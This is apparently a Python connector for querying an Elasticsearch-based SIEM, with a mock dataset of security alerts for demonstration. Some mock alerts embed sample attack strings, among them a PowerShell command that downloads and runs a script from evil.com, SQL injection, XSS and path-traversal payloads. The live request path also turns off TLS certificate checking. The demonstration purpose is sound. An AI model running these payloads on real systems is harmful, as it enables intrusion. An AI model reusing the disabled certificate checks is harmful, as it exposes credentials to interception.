import requests
import json
import re
import urllib3
from backend.config import ELASTICSEARCH_URL, ELASTICSEARCH_API_KEY, ELASTICSEARCH_USER, ELASTICSEARCH_PASSWORD, MOCK_SIEM

# Suppress SSL warnings for local development
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Rich Mock Data ---
MOCK_ALERTS = [
    # Brute force / authentication failures
    {
        "_source": {
            "timestamp": "2024-03-15T08:12:33Z",
            "rule": {"id": "5710", "description": "Multiple authentication failures", "level": 10, "groups": ["authentication_failed"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "203.0.113.45", "destip": "172.16.0.10", "srcport": "44821", "destport": "22", "protocol": "ssh"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sshd"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T08:12:45Z",
            "rule": {"id": "5710", "description": "Multiple authentication failures", "level": 10, "groups": ["authentication_failed"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "203.0.113.45", "destip": "172.16.0.10", "srcport": "44822", "destport": "22", "protocol": "ssh"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sshd"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T08:13:01Z",
            "rule": {"id": "5712", "description": "Brute force attack detected - 5 failed logins in 60 seconds", "level": 14, "groups": ["authentication_failed", "brute_force"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "203.0.113.45", "destip": "172.16.0.10", "srcport": "44823", "destport": "22", "protocol": "ssh"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sshd"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T09:30:00Z",
            "rule": {"id": "5710", "description": "Multiple authentication failures", "level": 10, "groups": ["authentication_failed"]},
            "agent": {"id": "003", "name": "mail-server-01", "ip": "172.16.0.30"},
            "data": {"srcip": "198.51.100.77", "destip": "172.16.0.30", "srcport": "55100", "destport": "25", "protocol": "smtp"},
            "location": "/var/log/mail.log",
            "decoder": {"name": "postfix"}
        }
    },
    # Malware / file integrity
    {
        "_source": {
            "timestamp": "2024-03-15T11:22:15Z",
            "rule": {"id": "554", "description": "File added to the system", "level": 7, "groups": ["syscheck", "file_integrity"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "syscheck": {"path": "/tmp/.hidden_backdoor.sh", "md5": "d41d8cd98f00b204e9800998ecf8427e", "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "size": "4096", "event": "added"},
            "data": {"srcip": "172.16.0.20"},
            "location": "syscheck",
            "decoder": {"name": "syscheck"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T11:25:00Z",
            "rule": {"id": "510", "description": "File integrity checksum changed - possible malware", "level": 12, "groups": ["syscheck", "file_integrity"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "syscheck": {"path": "/usr/bin/sshd", "md5_before": "abc123", "md5_after": "def456", "event": "modified"},
            "data": {"srcip": "172.16.0.20"},
            "location": "syscheck",
            "decoder": {"name": "syscheck"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T14:05:30Z",
            "rule": {"id": "554", "description": "File added to the system", "level": 7, "groups": ["syscheck", "file_integrity"]},
            "agent": {"id": "004", "name": "endpoint-win-01", "ip": "172.16.1.50"},
            "syscheck": {"path": "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe", "size": "245760", "event": "added"},
            "data": {"srcip": "172.16.1.50"},
            "location": "syscheck",
            "decoder": {"name": "syscheck"}
        }
    },
    # Firewall events
    {
        "_source": {
            "timestamp": "2024-03-15T06:45:12Z",
            "rule": {"id": "4101", "description": "Firewall drop event", "level": 5, "groups": ["firewall", "network"]},
            "agent": {"id": "005", "name": "fw-gateway-01", "ip": "10.0.0.1"},
            "data": {"srcip": "45.33.32.156", "destip": "172.16.0.10", "srcport": "12345", "destport": "3389", "protocol": "tcp", "action": "drop"},
            "location": "/var/log/firewall.log",
            "decoder": {"name": "iptables"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T06:45:18Z",
            "rule": {"id": "4101", "description": "Firewall drop event", "level": 5, "groups": ["firewall", "network"]},
            "agent": {"id": "005", "name": "fw-gateway-01", "ip": "10.0.0.1"},
            "data": {"srcip": "45.33.32.156", "destip": "172.16.0.10", "srcport": "12346", "destport": "445", "protocol": "tcp", "action": "drop"},
            "location": "/var/log/firewall.log",
            "decoder": {"name": "iptables"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T07:10:05Z",
            "rule": {"id": "4101", "description": "Firewall drop event", "level": 5, "groups": ["firewall", "network"]},
            "agent": {"id": "005", "name": "fw-gateway-01", "ip": "10.0.0.1"},
            "data": {"srcip": "185.220.101.34", "destip": "172.16.0.20", "srcport": "54321", "destport": "1433", "protocol": "tcp", "action": "drop"},
            "location": "/var/log/firewall.log",
            "decoder": {"name": "iptables"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T07:15:22Z",
            "rule": {"id": "4103", "description": "Port scan detected from external source", "level": 10, "groups": ["firewall", "network", "scan"]},
            "agent": {"id": "005", "name": "fw-gateway-01", "ip": "10.0.0.1"},
            "data": {"srcip": "45.33.32.156", "destip": "172.16.0.0/24", "protocol": "tcp", "action": "drop"},
            "location": "/var/log/firewall.log",
            "decoder": {"name": "iptables"}
        }
    },
    # Privilege escalation / sudo
    {
        "_source": {
            "timestamp": "2024-03-15T13:01:10Z",
            "rule": {"id": "5401", "description": "Successful sudo to root", "level": 4, "groups": ["sudo", "privilege_escalation"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "data": {"srcuser": "dbadmin", "dstuser": "root", "command": "/bin/systemctl restart mysql"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sudo"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T13:45:30Z",
            "rule": {"id": "5402", "description": "Unauthorized sudo attempt - user not in sudoers", "level": 12, "groups": ["sudo", "privilege_escalation"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcuser": "www-data", "dstuser": "root", "command": "/bin/bash"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sudo"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T15:20:00Z",
            "rule": {"id": "5403", "description": "User added to admin group", "level": 10, "groups": ["user_management", "privilege_escalation"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "data": {"srcuser": "unknown", "dstuser": "newadmin", "command": "usermod -aG sudo newadmin"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "groupmod"}
        }
    },
    # Web attacks
    {
        "_source": {
            "timestamp": "2024-03-15T10:15:44Z",
            "rule": {"id": "31104", "description": "SQL injection attempt detected", "level": 13, "groups": ["web", "attack", "injection"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "91.240.118.22", "destip": "172.16.0.10", "url": "/api/users?id=1' OR '1'='1", "method": "GET", "status_code": "403"},
            "location": "/var/log/nginx/access.log",
            "decoder": {"name": "nginx"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T10:16:02Z",
            "rule": {"id": "31105", "description": "XSS attack attempt detected", "level": 13, "groups": ["web", "attack", "xss"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "91.240.118.22", "destip": "172.16.0.10", "url": "/search?q=<script>alert('xss')</script>", "method": "GET", "status_code": "403"},
            "location": "/var/log/nginx/access.log",
            "decoder": {"name": "nginx"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T10:17:00Z",
            "rule": {"id": "31106", "description": "Directory traversal attempt", "level": 11, "groups": ["web", "attack"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "91.240.118.22", "destip": "172.16.0.10", "url": "/../../etc/passwd", "method": "GET", "status_code": "403"},
            "location": "/var/log/nginx/access.log",
            "decoder": {"name": "nginx"}
        }
    },
    # Successful login from unusual location
    {
        "_source": {
            "timestamp": "2024-03-15T03:22:00Z",
            "rule": {"id": "5715", "description": "Successful SSH login", "level": 3, "groups": ["authentication_success"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "data": {"srcip": "41.78.20.11", "destip": "172.16.0.20", "srcuser": "root", "protocol": "ssh"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sshd"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T08:00:00Z",
            "rule": {"id": "5715", "description": "Successful SSH login", "level": 3, "groups": ["authentication_success"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"srcip": "192.168.1.5", "destip": "172.16.0.10", "srcuser": "admin", "protocol": "ssh"},
            "location": "/var/log/auth.log",
            "decoder": {"name": "sshd"}
        }
    },
    # Windows events
    {
        "_source": {
            "timestamp": "2024-03-15T09:00:15Z",
            "rule": {"id": "60106", "description": "Windows audit policy changed", "level": 8, "groups": ["windows", "policy_changed"]},
            "agent": {"id": "004", "name": "endpoint-win-01", "ip": "172.16.1.50"},
            "data": {"win": {"eventdata": {"SubjectUserName": "SYSTEM", "CategoryId": "%%8274"}, "system": {"eventID": "4719"}}},
            "location": "EventChannel",
            "decoder": {"name": "windows_eventchannel"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T12:30:00Z",
            "rule": {"id": "60103", "description": "Windows: New service installed", "level": 7, "groups": ["windows", "service"]},
            "agent": {"id": "004", "name": "endpoint-win-01", "ip": "172.16.1.50"},
            "data": {"win": {"eventdata": {"ServiceName": "suspiciousSvc", "ServiceFileName": "C:\\Temp\\svc.exe"}, "system": {"eventID": "7045"}}},
            "location": "EventChannel",
            "decoder": {"name": "windows_eventchannel"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T14:10:00Z",
            "rule": {"id": "60110", "description": "Windows: PowerShell script block logging - encoded command", "level": 12, "groups": ["windows", "powershell"]},
            "agent": {"id": "004", "name": "endpoint-win-01", "ip": "172.16.1.50"},
            "data": {"win": {"eventdata": {"ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"}, "system": {"eventID": "4104"}}},
            "location": "EventChannel",
            "decoder": {"name": "windows_eventchannel"}
        }
    },
    # Vulnerability detection
    {
        "_source": {
            "timestamp": "2024-03-15T02:00:00Z",
            "rule": {"id": "23502", "description": "Vulnerability detected: CVE-2024-1234 - Critical OpenSSL RCE", "level": 15, "groups": ["vulnerability", "cve"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"vulnerability": {"cve": "CVE-2024-1234", "severity": "Critical", "package": "openssl", "version": "1.1.1k", "fix_version": "1.1.1w", "cvss": 9.8}},
            "location": "vulnerability-detector",
            "decoder": {"name": "vulnerability-detector"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T02:00:05Z",
            "rule": {"id": "23502", "description": "Vulnerability detected: CVE-2024-5678 - High Apache Log4j", "level": 13, "groups": ["vulnerability", "cve"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "data": {"vulnerability": {"cve": "CVE-2024-5678", "severity": "High", "package": "log4j", "version": "2.14.0", "fix_version": "2.17.1", "cvss": 8.5}},
            "location": "vulnerability-detector",
            "decoder": {"name": "vulnerability-detector"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T02:00:10Z",
            "rule": {"id": "23501", "description": "Vulnerability detected: CVE-2024-9012 - Medium nginx info disclosure", "level": 7, "groups": ["vulnerability", "cve"]},
            "agent": {"id": "001", "name": "web-server-01", "ip": "172.16.0.10"},
            "data": {"vulnerability": {"cve": "CVE-2024-9012", "severity": "Medium", "package": "nginx", "version": "1.18.0", "fix_version": "1.24.0", "cvss": 5.3}},
            "location": "vulnerability-detector",
            "decoder": {"name": "vulnerability-detector"}
        }
    },
    # Data exfiltration / anomaly
    {
        "_source": {
            "timestamp": "2024-03-15T16:00:00Z",
            "rule": {"id": "87901", "description": "Anomalous outbound data transfer detected - 500MB+ to external IP", "level": 14, "groups": ["anomaly", "data_exfiltration"]},
            "agent": {"id": "002", "name": "db-server-01", "ip": "172.16.0.20"},
            "data": {"srcip": "172.16.0.20", "destip": "104.21.45.67", "bytes_sent": 524288000, "protocol": "https", "duration": 1800},
            "location": "/var/log/network/netflow.log",
            "decoder": {"name": "netflow"}
        }
    },
    # DNS anomaly
    {
        "_source": {
            "timestamp": "2024-03-15T12:00:00Z",
            "rule": {"id": "87501", "description": "DNS query to known malicious domain", "level": 13, "groups": ["dns", "threat_intel"]},
            "agent": {"id": "004", "name": "endpoint-win-01", "ip": "172.16.1.50"},
            "data": {"srcip": "172.16.1.50", "dns": {"query": "c2-server.evil-domain.xyz", "type": "A", "rcode": "NOERROR", "answer": "104.21.45.67"}},
            "location": "/var/log/dns.log",
            "decoder": {"name": "dns"}
        }
    },
    {
        "_source": {
            "timestamp": "2024-03-15T12:05:00Z",
            "rule": {"id": "87502", "description": "Suspicious DNS TXT query - possible data exfiltration via DNS tunneling", "level": 11, "groups": ["dns", "anomaly"]},
            "agent": {"id": "004", "name": "endpoint-win-01", "ip": "172.16.1.50"},
            "data": {"srcip": "172.16.1.50", "dns": {"query": "dGhpcyBpcyBlbmNvZGVkIGRhdGE.tunnel.evil-domain.xyz", "type": "TXT"}},
            "location": "/var/log/dns.log",
            "decoder": {"name": "dns"}
        }
    },
]

# Keywords mapped to relevant alert groups for smart filtering
KEYWORD_GROUPS = {
    "brute force": ["authentication_failed", "brute_force"],
    "login": ["authentication_failed", "authentication_success", "brute_force"],
    "auth": ["authentication_failed", "authentication_success", "brute_force", "sudo"],
    "failed": ["authentication_failed", "brute_force"],
    "ssh": ["authentication_failed", "authentication_success", "brute_force"],
    "firewall": ["firewall", "network"],
    "blocked": ["firewall"],
    "port scan": ["scan", "firewall"],
    "scan": ["scan", "firewall"],
    "malware": ["syscheck", "file_integrity"],
    "file": ["syscheck", "file_integrity"],
    "integrity": ["syscheck", "file_integrity"],
    "sql injection": ["injection", "web", "attack"],
    "xss": ["xss", "web", "attack"],
    "web attack": ["web", "attack"],
    "injection": ["injection", "web"],
    "privilege": ["privilege_escalation", "sudo"],
    "sudo": ["sudo", "privilege_escalation"],
    "escalation": ["privilege_escalation"],
    "root": ["privilege_escalation", "sudo"],
    "vulnerability": ["vulnerability", "cve"],
    "cve": ["vulnerability", "cve"],
    "patch": ["vulnerability", "cve"],
    "critical": ["vulnerability", "cve"],
    "windows": ["windows"],
    "powershell": ["windows", "powershell"],
    "service": ["windows", "service"],
    "exfiltration": ["data_exfiltration", "anomaly"],
    "data transfer": ["data_exfiltration", "anomaly"],
    "anomaly": ["anomaly", "data_exfiltration"],
    "dns": ["dns", "threat_intel"],
    "tunnel": ["dns", "anomaly"],
    "c2": ["dns", "threat_intel"],
    "threat": ["threat_intel", "dns"],
    "high severity": [],  # special handling
    "critical severity": [],  # special handling
    "agent": [],  # special handling
}


class SIEMConnector:
    def __init__(self):
        self.url = ELASTICSEARCH_URL.rstrip('/')
        self.auth = None
        self.headers = {"Content-Type": "application/json"}
        self.mock_mode = MOCK_SIEM

        if not self.mock_mode:
            if ELASTICSEARCH_API_KEY:
                self.headers["Authorization"] = f"ApiKey {ELASTICSEARCH_API_KEY}"
            elif ELASTICSEARCH_USER and ELASTICSEARCH_PASSWORD:
                self.auth = (ELASTICSEARCH_USER, ELASTICSEARCH_PASSWORD)

    def _request(self, method, endpoint, body=None):
        if self.mock_mode:
            return self._get_mock_response(endpoint, body)

        url = f"{self.url}/{endpoint.lstrip('/')}"
        try:
            response = requests.request(
                method,
                url,
                auth=self.auth,
                headers=self.headers,
                json=body,
                verify=False,
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except requests.exceptions.ConnectionError:
            return {"error": "Connection to Elasticsearch failed. Please check if the server is running."}
        except Exception as e:
            return {"error": str(e)}

    def _filter_mock_alerts(self, body):
        """Smart filtering of mock alerts based on the DSL query body."""
        if not body:
            return MOCK_ALERTS

        body_str = json.dumps(body).lower()

        # Check for severity/level filters
        level_match = re.search(r'"gte"\s*:\s*(\d+)', body_str)
        min_level = int(level_match.group(1)) if level_match else None

        # Find matching keyword groups
        matched_groups = set()
        for keyword, groups in KEYWORD_GROUPS.items():
            if keyword in body_str:
                matched_groups.update(groups)

        # Also check for agent name filters
        agent_match = re.search(r'"(web-server|db-server|mail-server|fw-gateway|endpoint-win)[^"]*"', body_str)

        filtered = []
        for alert in MOCK_ALERTS:
            src = alert["_source"]
            rule_groups = set(src.get("rule", {}).get("groups", []))
            rule_level = src.get("rule", {}).get("level", 0)
            agent_name = src.get("agent", {}).get("name", "")

            # Filter by level
            if min_level and rule_level < min_level:
                continue

            # Filter by agent name
            if agent_match and agent_match.group(1) not in agent_name:
                continue

            # Filter by keyword groups
            if matched_groups and not rule_groups.intersection(matched_groups):
                continue

            filtered.append(alert)

        return filtered if filtered else MOCK_ALERTS

    def _get_mock_response(self, endpoint, body):
        """Returns sample data for demonstration when live SIEM is unavailable."""
        if "_cat/indices" in endpoint:
            return [
                {"health": "green", "status": "open", "index": "wazuh-alerts-4.x-2024.03.15", "pri": "1", "rep": "0", "docs.count": "15420"},
                {"health": "green", "status": "open", "index": "wazuh-alerts-4.x-2024.03.14", "pri": "1", "rep": "0", "docs.count": "12850"},
                {"health": "green", "status": "open", "index": "filebeat-2024.03.15", "pri": "1", "rep": "0", "docs.count": "3420"},
                {"health": "yellow", "status": "open", "index": "wazuh-monitoring-2024.03.15", "pri": "1", "rep": "1", "docs.count": "980"},
            ]
        elif "_mapping" in endpoint:
            return {
                "wazuh-alerts-4.x-2024.03.15": {
                    "mappings": {
                        "properties": {
                            "timestamp": {"type": "date"},
                            "rule": {"properties": {
                                "id": {"type": "keyword"},
                                "description": {"type": "text"},
                                "level": {"type": "integer"},
                                "groups": {"type": "keyword"}
                            }},
                            "agent": {"properties": {
                                "id": {"type": "keyword"},
                                "name": {"type": "keyword"},
                                "ip": {"type": "ip"}
                            }},
                            "data": {"properties": {
                                "srcip": {"type": "ip"},
                                "destip": {"type": "ip"},
                                "srcport": {"type": "keyword"},
                                "destport": {"type": "keyword"},
                                "protocol": {"type": "keyword"},
                                "srcuser": {"type": "keyword"},
                                "dstuser": {"type": "keyword"},
                                "url": {"type": "text"},
                                "action": {"type": "keyword"},
                                "vulnerability": {"properties": {
                                    "cve": {"type": "keyword"},
                                    "severity": {"type": "keyword"},
                                    "cvss": {"type": "float"},
                                    "package": {"type": "keyword"}
                                }},
                                "dns": {"properties": {
                                    "query": {"type": "keyword"},
                                    "type": {"type": "keyword"}
                                }}
                            }},
                            "syscheck": {"properties": {
                                "path": {"type": "keyword"},
                                "event": {"type": "keyword"},
                                "md5": {"type": "keyword"},
                                "sha256": {"type": "keyword"}
                            }},
                            "location": {"type": "keyword"},
                            "decoder": {"properties": {"name": {"type": "keyword"}}}
                        }
                    }
                }
            }
        elif "_search" in endpoint:
            filtered = self._filter_mock_alerts(body)
            return {
                "hits": {
                    "total": {"value": len(filtered), "relation": "eq"},
                    "hits": filtered
                }
            }
        return {}

    def execute_query(self, index: str, query: dict):
        return self._request("POST", f"{index}/_search", body=query)

    def get_indices(self):
        return self._request("GET", "_cat/indices?format=json")

    def get_mapping(self, index: str):
        return self._request("GET", f"{index}/_mapping")
